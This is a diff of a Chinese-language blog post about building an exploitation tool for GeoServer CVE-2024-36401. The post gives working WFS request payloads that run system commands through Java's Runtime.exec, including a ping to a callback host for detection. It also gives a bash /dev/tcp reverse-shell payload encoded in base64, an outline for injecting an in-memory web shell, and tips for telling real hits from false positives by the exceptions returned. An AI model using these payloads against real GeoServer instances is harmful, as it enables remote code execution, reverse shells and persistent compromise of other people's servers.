@@ -3,17 +3,23 @@
 geoserver CVE-2024-36401
 
 原本没打算写的，主要是想着直接去搜一下工具，直接用着就OK了
+
 找到一个geoserver CVE-2024-36401漏洞利用工具
+
 GeoServer 综合漏洞扫描工具V1.2 发布！
 
 ![image](https://github.com/MInggongK/geoserver-/blob/main/dsfdsf.png)
 
 但是实际使用下来感觉到这个工具有点点拉跨，稍微一点点吐槽哈，号称是go语言写的，速度极快，主要表现是两点
+
 1、闪退，不明原因的闪退，检测都要闪退
+
 2、使用yakit漏洞是存在的，但是他这个工具不存在，就没明白怎么回事，估计是他的判断逻辑上出了问题
 
 那么就想着能不能自己写一个试试
+
 但是发现这个漏洞实际写下来，也没那么简单
+
 简单说一下编写思路吧
 
 1，默认payload:
@@ -38,26 +44,39 @@ xmlns:wfs='http://www.opengis.net/wfs/2.0'>
 </wfs:GetPropertyValue>
 
 那么注意这里： <wfs:Query typeNames='sf:archsites'/>
+
 这个地方，如果你需要采取正则的方式去拿到，这个是sf:archsites网站的一个基本标识，你需要先拿到他的
+
 <wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>信息，然后你可以采取拼接的方式
+
 判断漏洞的时候
   <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping wsn9.callback.red')</wfs:valueReference>
+  
   这个地方，其实都不用去查找dns记录
+  
   简单的逻辑就是判断是否存在异常的类
+  
   如java.lang.ClassCastException
+  
 当然，这只是判断逻辑
+
 这个回显本来就是400，这个地方容易踩坑，你需要判断错误页面后，进行数据查找
 
 首先你需要请求一个
 <wfs:ListStoredQueries service='WFS'\n" +
  " version='2.0.0'\n" +
  " xmlns:wfs='http://www.opengis.net/wfs/2.0'/>
+ 
  这个信息代表了你可以拿到他的<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>
+ 
  然后直接赋值给文本，然后再调一个函数方法，把文本的截取的信息，拼接到参数的<wfs:Query typeNames='sf:archsites'/>这里
+ 
  这条就会对判断的逻辑相对精准，检测类就这么写就可以了
+ 
  如果你只是一直使用 <wfs:Query typeNames='sf:archsites'/>，那么误判的几率很高，会提示找不到这个sf:archsites
 
  反弹类
+ 
 我们看看反弹的payload:
 
 POST /geoserver/wfs HTTP/1.1
@@ -85,11 +104,17 @@ Content-Length: 438
 </wfs:GetPropertyValue>
 
 我们注意这里：
+
 <wfs:Query typeNames='sf:archsites'/>
+
 同样，先要正则取值然后拼接给他
+
 然后直接请求
+
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx这里是加密过的base64
+
 编写的时候，就把用户输入的bash -i >& /dev/tcp/127.0.0.1/9999 0>&1，转换成base64就可以了
+
 然后发请求，同样，去找关键的异常类，判断逻辑即可
 
 内存马注入类
@@ -126,11 +151,14 @@ unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null
 </wfs:GetPropertyValue>
 
 这个地方还是有  <wfs:Query typeNames='sf:archsites'/>，老规矩，先取值
+
 在star这里，放入你生成的base64的内存马加密代码
+
 然后判断逻辑即可
 
 容易踩坑的点
 1、  <wfs:Query typeNames='sf:archsites'/>重复利用，误判几率98%，报错如下：
+
 https://geoserver.epic.blue/geoserver/schemas/ows/1.1.0/owsAll.xsd">
 <ows:Exception exceptionCode="InvalidParameterValue" locator="typeName">
 <ows:ExceptionText>Could not locate {http://www.openplans.org/spearfish}archsites in catalog.<
@@ -142,10 +170,12 @@ class java.lang.ProcessImpl cannot be cast to class org.opengis.feature.type.Att
 </ows:Exception>
 
 简单来讲存在漏洞就是java.lang.ClassCastException
+
 误判就是Could not locate {http://www.openplans.org/spearfish}archsites in catalog
 
 2、判断方式：
 抓取调用的wfs:ReturnFeatureType>，赋给文本-文本调用函数方法，请求，拼接在请求，判断回显的异常
+
 文本调用函数这里，需要提前给值，这样防止出现空指针异常，请求前拼接，判断回显的异常，是异常内进行判断
 
 最终我们实现了这个漏洞利用工具的编写
